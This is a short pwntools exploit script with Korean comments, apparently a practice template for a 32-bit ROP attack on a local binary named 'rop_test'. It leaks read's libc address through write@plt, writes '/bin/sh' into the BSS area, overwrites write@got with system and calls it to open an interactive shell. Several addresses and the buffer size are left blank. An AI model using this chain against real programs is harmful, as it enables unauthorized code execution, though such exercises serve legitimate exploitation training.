# -*- coding: utf-8 -*-
from pwn import *

p = process('./rop_test')
e = ELF('./rop_test')

# 필요한 정보 변수화
read_plt = # read@plt
read_got = # read@got
write_plt = # write@plt
write_got = # write@got
system_offset = # read - system
pppr = # pop pop pop ret의 주소 
bss = # BSS 영역의 주소

# buffer overflow
payload = # 버퍼 크기
 
# 1. read() 실제 주소 획득
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
  
# 3. bss 영역에 "/bin/sh" 쓰기
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
 
# 4. write@got에 system@plt got overwrite
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

# 5. "/bin/sh"를 인자로 write() 호출 - system("/bin/sh")
payload += p32(write_plt)
payload += 'A' * 4
payload += p32(bss) # /bin/sh
 
p.send(payload)

read_addr = u32(p.recv()[-4:]) # 1. read() 실제 주소 획득하여 변수 저장
system_addr = read_addr - system_offset # 2. read() - system()을 이용하여 system 구하기
log.info('system@plt = 0x%x' % system_addr)
 
p.send('/bin/sh\x00') # 3. bss 영역에 "/bin/sh" 쓰기
p.send(p32(system_addr)) # 4. got overwrite
 
p.interactive() # shell과 연결 (명령어 주고 받을 수 있는 상태로 전환)

